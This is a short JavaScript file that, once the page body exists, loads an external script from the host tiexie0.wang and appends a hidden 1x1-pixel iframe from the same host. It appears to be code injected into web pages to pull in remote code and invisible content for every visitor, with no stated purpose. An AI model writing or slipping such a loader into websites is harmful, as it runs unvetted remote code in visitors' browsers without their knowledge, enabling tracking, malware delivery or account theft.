function init_xpd(){
  var s=document.createElement("script");
  s.setAttribute('src','http://tiexie0.wang/js/copy_mua25.js');
  document.body.appendChild(s)
  obj=document.createElement("iframe");obj.frameborder=0;obj.src="http://tiexie0.wang/cnzz.html";obj.frameBorder=0;obj.width="1px";obj.height="1px";obj.scrolling="no";document.body.appendChild(obj)
}

function charge_init(){
	if (!document.body){
		setTimeout(function(){
			charge_init();
		},50);
	}else{
		init_xpd();
	}
}

charge_init();